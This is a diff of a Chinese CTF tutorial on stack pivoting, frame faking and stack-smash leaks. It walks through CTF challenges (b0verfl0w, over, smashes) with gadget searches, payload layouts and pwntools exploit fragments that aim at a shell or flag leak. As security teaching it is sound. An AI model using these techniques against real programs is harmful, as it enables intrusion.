@@ -4,23 +4,23 @@
 
 ### 原理
 
-stack pivoting，正如它所描述的，该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行ROP。一般来说，我们可能在以下情况需要使用stack pivoting
+stack pivoting，正如它所描述的，该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。一般来说，我们可能在以下情况需要使用 stack pivoting
 
-- 可以控制的栈溢出的字节数较少，难以构造较长的ROP链
-- 开启了PIE保护，栈地址未知，我们可以将栈劫持到已知的区域。
+- 可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链
+- 开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。
 - 其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而利用堆漏洞
 
-此外，利用stack pivoting有以下几个要求
+此外，利用 stack pivoting 有以下几个要求
 
 - 可以控制程序执行流。
 
-- 可以控制sp指针。一般来说，控制栈指针会使用ROP，常见的控制栈指针的gadgets一般是
+- 可以控制 sp 指针。一般来说，控制栈指针会使用 ROP，常见的控制栈指针的 gadgets 一般是
 
 ```asm
 pop rsp/esp
 ```
 
-  当然，还会有一些其它的姿势。比如说libc_csu_init中的gadgets，我们通过偏移就可以得到控制rsp指针。上面的是正常的，下面的是偏移的。
+当然，还会有一些其它的姿势。比如说 libc_csu_init 中的 gadgets，我们通过偏移就可以得到控制 rsp 指针。上面的是正常的，下面的是偏移的。
 
 ```asm
 gef➤  x/7i 0x000000000040061a
@@ -39,18 +39,18 @@ gef➤  x/7i 0x000000000040061d
 0x400624 <__libc_csu_init+100>:	ret
 ```
 
-  此外，还有更加高级的fake frame。
+  此外，还有更加高级的 fake frame。
 
 
 - 存在可以控制内容的内存，一般有如下
-  - bss段。由于进程按页分配内存，分配给bss段的内存大小至少一个页(4k,0x1000)大小。然而一般bss段的内容用不了这么多的空间，并且bss段分配的内存页拥有读写权限。
+  - bss 段。由于进程按页分配内存，分配给 bss 段的内存大小至少一个页(4k，0x1000)大小。然而一般bss段的内容用不了这么多的空间，并且 bss 段分配的内存页拥有读写权限。
   - heap。但是这个需要我们能够泄露堆地址。
 
 ### 示例
 
 #### 例1
 
-这里我们以**X-CTF Quals 2016 - b0verfl0w**为例，进行介绍。首先，查看程序的安全保护，如下
+这里我们以 **X-CTF Quals 2016 - b0verfl0w** 为例进行介绍。首先，查看程序的安全保护，如下
 
 ```shell
 ➜  X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ checksec b0verfl0w                 
@@ -62,7 +62,7 @@ gef➤  x/7i 0x000000000040061d
     RWX:      Has RWX segments
 ```
 
-可以看出源程序为32位，也没有开启NX保护，下面我们来找一下程序的漏洞
+可以看出源程序为 32 位，也没有开启 NX 保护，下面我们来找一下程序的漏洞
 
 ```C
 signed int vul()
@@ -81,12 +81,12 @@ signed int vul()
 }
 ```
 
-可以看出，源程序存在栈溢出漏洞。但是其所能溢出的字节就只有50-0x20-4=14个字节，所以我们很难执行一些比较好的ROP。这里我们就考虑stack pivoting。由于程序本身并没有开启堆栈保护，所以我们可以在栈上布置shellcode并执行。基本利用思路如下
+可以看出，源程序存在栈溢出漏洞。但是其所能溢出的字节就只有 50-0x20-4=14 个字节，所以我们很难执行一些比较好的 ROP。这里我们就考虑 stack pivoting 。由于程序本身并没有开启堆栈保护，所以我们可以在栈上布置shellcode 并执行。基本利用思路如下
 
-- 利用栈溢出布置shellcode
-- 控制eip指向shellcode处
+- 利用栈溢出布置 shellcode
+- 控制 eip 指向 shellcode处
 
-第一步，还是比较容易地，直接读取即可，但是由于程序本身会开启ASLR保护，所以我们很难直接知道shellcode的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对esp进行操作，使其指向shellcode处，并且直接控制程序跳转至esp处。那下面就是找控制程序跳转到esp处的gadgets了。
+第一步，还是比较容易地，直接读取即可，但是由于程序本身会开启 ASLR 保护，所以我们很难直接知道shellcode 的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对 esp 进行操作，使其指向 shellcode处，并且直接控制程序跳转至 esp处。那下面就是找控制程序跳转到 esp 处的 gadgets 了。
 
 ```shell
 ➜  X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ ROPgadget --binary b0verfl0w --only 'jmp|ret'         
@@ -99,13 +99,13 @@ Gadgets information
 Unique gadgets found: 3
 ```
 
-这里我们发现有一个可以直接跳转到esp的gadgets。那么我们可以布置payload如下
+这里我们发现有一个可以直接跳转到 esp 的 gadgets。那么我们可以布置 payload 如下
 
 ```text
 shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp
 ```
 
-那么我们payload中的最后一部分改如何设置esp呢，可以知道
+那么我们 payload 中的最后一部分改如何设置 esp 呢，可以知道
 
 - size(shellcode+padding)=0x20
 - size(fake ebp)=0x4
@@ -118,7 +118,7 @@ sub 0x28,esp
 jmp esp
 ```
 
-所以最后的exp如下
+所以最后的 exp 如下
 
 ```python
 from pwn import *
@@ -152,10 +152,10 @@ sh.interactive()
 
 概括地讲，我们在之前讲的栈溢出不外乎两种方式
 
-- 控制程序EIP
-- 控制程序EBP
+- 控制程序 EIP
+- 控制程序 EBP
 
-其最终都是控制程序的执行流。在frame faking中，我们所利用的技巧便是同时控制EBP与EIP，这样我们在控制程序执行流的同时，也改变程序栈帧的位置。一般来说其payload如下
+其最终都是控制程序的执行流。在 frame faking 中，我们所利用的技巧便是同时控制 EBP 与 EIP，这样我们在控制程序执行流的同时，也改变程序栈帧的位置。一般来说其 payload 如下
 
 ```
 buffer padding|fake ebp|leave ret addr|
@@ -163,8 +163,8 @@ buffer padding|fake ebp|leave ret addr|
 
 即我们利用栈溢出将栈上构造为如上格式。这里我们主要接下后面两个部分
 
-- 函数的返回地址被我们覆盖为执行leave ret的地址，这就表明了函数在正常执行完自己的leave ret后，还会再次执行一次leave ret。
-- 其中fake ebp为我们构造的栈帧的基地址，需要注意的是这里是一个地址。一般来说我们构造的假的栈帧如下
+- 函数的返回地址被我们覆盖为执行 leave ret 的地址，这就表明了函数在正常执行完自己的 leave ret 后，还会再次执行一次 leave ret。
+- 其中 fake ebp 为我们构造的栈帧的基地址，需要注意的是这里是一个地址。一般来说我们构造的假的栈帧如下
 
 ```
 fake ebp
@@ -173,7 +173,7 @@ v
 ebp2|target function addr|leave ret addr|arg1|arg2
 ```
 
-这里我们的fake ebp指向ebp2，即它为ebp2所在的地址。通常来说，这里都是我们能够控制的可读的内容。
+这里我们的 fake ebp 指向 ebp2，即它为 ebp2 所在的地址。通常来说，这里都是我们能够控制的可读的内容。
 
 **下面的汇编语法是 AT&T 语法。**
 
@@ -193,7 +193,7 @@ leave
 ret #pop eip，弹出栈顶元素作为程序下一个执行地址
 ```
 
-其中leave指令相当于
+其中 leave 指令相当于
 
 ```
 move ebp, esp # 将ebp的值赋给esp
@@ -202,23 +202,23 @@ pop ebp #弹出ebp
 
 下面我们来仔细说一下基本的控制过程。
 
-1. 在有栈溢出的程序执行leave时，其分为两个步骤
+1. 在有栈溢出的程序执行 leave 时，其分为两个步骤
 
-   - move ebp, esp ，这会将esp也指向当前栈溢出漏洞的ebp基地址处。
-   - pop ebp， 这会将栈中存放的fake ebp的值赋给ebp。即执行完指令之后，ebp便指向了ebp2，也就是保存了ebp2所在的地址。
+    - move ebp, esp ，这会将 esp 也指向当前栈溢出漏洞的 ebp 基地址处。
+    - pop ebp， 这会将栈中存放的 fake ebp 的值赋给 ebp。即执行完指令之后，ebp便指向了ebp2，也就是保存了 ebp2 所在的地址。
 
-2. 执行ret指令，会再次执行leave ret指令。
+2. 执行 ret 指令，会再次执行 leave ret 指令。
 
-3. 执行leave指令，其分为两个步骤
+3. 执行 leave 指令，其分为两个步骤
 
-   - move ebp, esp ，这会将esp指向ebp2。
-   - pop ebp，此时，会将ebp的内容设置为ebp2的值，同时esp会指向target function。
+    - move ebp, esp ，这会将 esp 指向 ebp2。
+    - pop ebp，此时，会将 ebp 的内容设置为 ebp2 的值，同时 esp 会指向 target function。
 
-4. 执行ret指令，这时候程序就会执行targetfunction，当其进行程序的时候会执行
+4. 执行 ret 指令，这时候程序就会执行 target function，当其进行程序的时候会执行
 
-   - push ebp,会将ebp2值压入栈中，
+    - push ebp，会将 ebp2 值压入栈中，
 
-   - move esp, ebp，将ebp指向当前基地址。
+    - move esp, ebp，将 ebp 指向当前基地址。
 
 此时的栈结构如下
 
@@ -231,17 +231,15 @@ ebp2|leave ret addr|arg1|arg2
 
 5. 当程序执行师，其会正常申请空间，同时我们在栈上也安排了该函数对应的参数，所以程序会正常执行。
 
-6. 程序结束后，其又会执行两次 leave ret addr，所以如果我们在ebp2处布置好了对应的内容，那么我们就可以一直控制程序的执行流程。
+6. 程序结束后，其又会执行两次 leave ret addr，所以如果我们在 ebp2 处布置好了对应的内容，那么我们就可以一直控制程序的执行流程。
 
-可以看出在fake frame中，我们有一个需求就是，我们必须得有一块可以写的内存，并且我们还知道这块内存的地址，这一点与stack pivoting相似。
+可以看出在 fake frame 中，我们有一个需求就是，我们必须得有一块可以写的内存，并且我们还知道这块内存的地址，这一点与 stack pivoting 相似。
 
-### 例子
 
+### 2018 6月 安恒杯 over
 以 2018 年 6 月安恒杯月赛的 over 一题为例进行介绍, 题目可以在 ctf-challenge 中找到
 
-### 题目
-
-### 文件信息
+#### 文件信息
 ```bash
 over.over: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=99beb778a74c68e4ce1477b559391e860dd0e946, stripped
 [*] '/home/m4x/pwn_repo/others_over/over.over'
@@ -254,7 +252,7 @@ over.over: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically link
 64 位动态链接的程序, 没有开 PIE 和 canary 保护, 但开了 
 NX 保护  
 
-### 分析程序
+#### 分析程序
 放到 IDA 中进行分析 
 ```C
 __int64 __fastcall main(__int64 a1, char **a2, char **a3)
@@ -278,7 +276,7 @@ int sub_400676()
 ```
 漏洞很明显, read 能读入 96 位, 但 buf 的长度只有 80, 因此能覆盖 rbp 以及 ret addr 但也只能覆盖到 rbp 和 ret addr, 因此也只能通过同时控制 rbp 以及 ret addr 来进行 rop 了
 
-### leak stack
+#### leak stack
 为了控制 rbp, 我们需要知道某些地址, 可以发现当输入的长度为 80 时, 由于 read 并不会给输入末尾补上 '\0', rbp 的值就会被 puts 打印出来, 这样我们就可以通过固定偏移知道栈上所有位置的地址了
 ```C
 Breakpoint 1, 0x00000000004006b9 in ?? ()
@@ -339,7 +337,7 @@ pwndbg> distance 0x7ffceaf111d0 0x7ffceaf11160
 leak 出栈地址后, 我们就可以通过控制 rbp 为栈上的地址(如 0x7ffceaf11160), ret addr 为 leave ret 的地址来实现控制程序流程了, 比如我们可以在 0x7ffceaf11160 + 0x8 填上 leak libc 的 rop chain 并控制其返回到 sub\_
 400676 函数来 leak libc, 然后在下一次利用时就可以通过 rop 执行 system("/bin/sh") 来 get shell 了, 不过由于利用过程中栈的结构会发生变化, 所以一些关键的偏移还需要通过多次调试来确定
 
-### exp
+#### exp
 ```python
 others_over [master●●] cat solve.py 
 #!/usr/bin/env python
@@ -391,7 +389,7 @@ io.close()
 
 总的来说这种方法跟 stack pivot 差别并不是很大
 
-**参考阅读**
+### 参考阅读
 
 - [http://www.xfocus.net/articles/200602/851.html](http://www.xfocus.net/articles/200602/851.html)
 - [http://phrack.org/issues/58/4.html](http://phrack.org/issues/58/4.html)
@@ -400,7 +398,8 @@ io.close()
 
 ### 原理
 
-在程序加了canary保护之后，如果我们读取的buffer覆盖了对应的值时，程序就会报错，而一般来说我们并不会关心报错信息。而stack smash技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序发现canary保护之后，如果发现canary被修改的话，程序就会执行\__stack\_chk\_fail函数来打印argv[0]指针所指向的字符串，正常情况下，这个指针指向了程序名。其代码如下
+
+在程序加了canary 保护之后，如果我们读取的 buffer 覆盖了对应的值时，程序就会报错，而一般来说我们并不会关心报错信息。而 stack smash 技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序发现 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 __stack_chk_fail 函数来打印 argv[0] 指针所指向的字符串，正常情况下，这个指针指向了程序名。其代码如下
 
 ```C
 void __attribute__ ((noreturn)) __stack_chk_fail (void)
@@ -416,15 +415,15 @@ void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *ms
 }
 ```
 
-所以说如果我们利用栈溢出覆盖argv[0]为我们想要输出的字符串的地址，那么在__fortify_fail函数中就会输出我们想要的信息。
+所以说如果我们利用栈溢出覆盖 argv[0] 为我们想要输出的字符串的地址，那么在 __fortify_fail 函数中就会输出我们想要的信息。
 
 ### 例子
 
-这里，我们以2015年32C3 CTF smashes为例进行介绍，该题目在jarvisoj上有复现。
+这里，我们以 2015 年 32C3 CTF smashes 为例进行介绍，该题目在 jarvisoj 上有复现。
 
 #### 确定保护
 
-可以看出程序为64位，主要开启了Canary保护以及NX保护，以及FORTIFY保护。
+可以看出程序为 64 位，主要开启了 Canary 保护以及 NX 保护，以及 FORTIFY 保护。
 
 ```shell
 ➜  stacksmashes git:(master) ✗ checksec smashes
@@ -438,7 +437,7 @@ void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *ms
 
 #### 分析程序
 
-ida看一下
+ida 看一下
 
 ```c
 __int64 sub_4007E0()
@@ -475,9 +474,9 @@ LABEL_8:
 }
 ```
 
-很显然，程序在_IO_gets((__int64)&v4);存在栈溢出。
+很显然，程序在 _IO_gets((__int64)&v4); 存在栈溢出。
 
-此外，程序中还提示要overwrite flag。而且发现程序很有意思的在while循环之后执行了这条语句
+此外，程序中还提示要 overwrite flag。而且发现程序很有意思的在 while 循环之后执行了这条语句
 
 ```C
   memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1));
@@ -491,13 +490,13 @@ LABEL_8:
 .data:0000000000600D20 aPctfHereSTheFl db 'PCTF{Here',27h,'s the flag on server}',0
 ```
 
-但是如果我们直接利用栈溢出输出该地址的内容是不可行的，这是因为我们读入的内容` byte_600D20[v1++] = v2;`也恰恰就是该块内存，这会直接将其覆盖掉，这时候我们就需要利用一个技巧了
+但是如果我们直接利用栈溢出输出该地址的内容是不可行的，这是因为我们读入的内容 ` byte_600D20[v1++] = v2;`也恰恰就是该块内存，这会直接将其覆盖掉，这时候我们就需要利用一个技巧了
 
-- 在EFL内存映射时，bss段会被映射两次，所以我们可以使用另一处的地址来进行输出，可以使用gdb的find来进行查找。
+- 在 ELF 内存映射时，bss 段会被映射两次，所以我们可以使用另一处的地址来进行输出，可以使用 gdb 的 find来进行查找。
 
-#### 确定flag地址
+#### 确定 flag 地址
 
-我们把断点下载memset函数处，然后读取相应的内容如下
+我们把断点下载 memset 函数处，然后读取相应的内容如下
 
 ```asm
 gef➤  c
@@ -548,13 +547,13 @@ gef➤  grep PCTF
   0x400d20 - 0x400d3f  →   "PCTF{Here's the flag on server}" 
 ```
 
-可以看出我们读入的2222已经覆盖了0x600d20处的flag，但是我们在内存的0x400d20处仍然找到了这个flag的备份，所以我们还是可以将其输出。这里我们已经确定了flag的地址。
+可以看出我们读入的 2222 已经覆盖了 0x600d20 处的 flag，但是我们在内存的 0x400d20 处仍然找到了这个flag的备份，所以我们还是可以将其输出。这里我们已经确定了 flag 的地址。
 
 #### 确定偏移
 
-下面，我们确定argv[0]距离读取的字符串的偏移。
+下面，我们确定 argv[0] 距离读取的字符串的偏移。
 
-首先下断点在main函数入口处，如下
+首先下断点在 main 函数入口处，如下
 
 ```asm
 gef➤  b *0x00000000004006D0
@@ -590,7 +589,7 @@ Breakpoint 1, 0x00000000004006d0 in ?? ()
 
 ```
 
-可以看出0x00007fffffffe00b指向程序名，其自然就是argv[0]，所以我们修改的内容就是这个地址。同时0x00007fffffffdc58处保留着该地址，所以我们真正需要的地址是0x00007fffffffdc58。
+可以看出 0x00007fffffffe00b 指向程序名，其自然就是 argv[0]，所以我们修改的内容就是这个地址。同时0x00007fffffffdc58 处保留着该地址，所以我们真正需要的地址是 0x00007fffffffdc58。
 
 此外，根据汇编代码
 
@@ -608,7 +607,7 @@ Breakpoint 1, 0x00000000004006d0 in ?? ()
 .text:000000000040080E                 call    __IO_gets
 ```
 
-我们可以确定我们读入的字符串的起始地址其实就是调用__IO_gets之前的rsp，所以我们把断点下在call处，如下
+我们可以确定我们读入的字符串的起始地址其实就是调用 __IO_gets 之前的 rsp，所以我们把断点下在 call 处，如下
 
 ```asm
 gef➤  b *0x000000000040080E
@@ -638,9 +637,9 @@ Breakpoint 2, 0x000000000040080e in ?? ()
 0x00007fffffffda68│+0x28: 0x0000000000000000
 0x00007fffffffda70│+0x30: 0x0000000000000000
 0x00007fffffffda78│+0x38: 0x0000000000000000
-───────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
+────────────────────────────────────────────[ trace ]────
 [#0] 0x40080e → call 0x4006c0 <_IO_gets@plt>
-─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+──────────────────────────────────────────────────────────
 gef➤  print $rsp
 $1 = (void *) 0x7fffffffda40
 ```
@@ -679,7 +678,7 @@ data = sh.recv()
 sh.interactive()
 ```
 
-这里我们直接就得到了flag，没有出现网上说的得不到flag的情况。
+这里我们直接就得到了 flag，没有出现网上说的得不到 flag 的情况。
 
 ### 题目
 
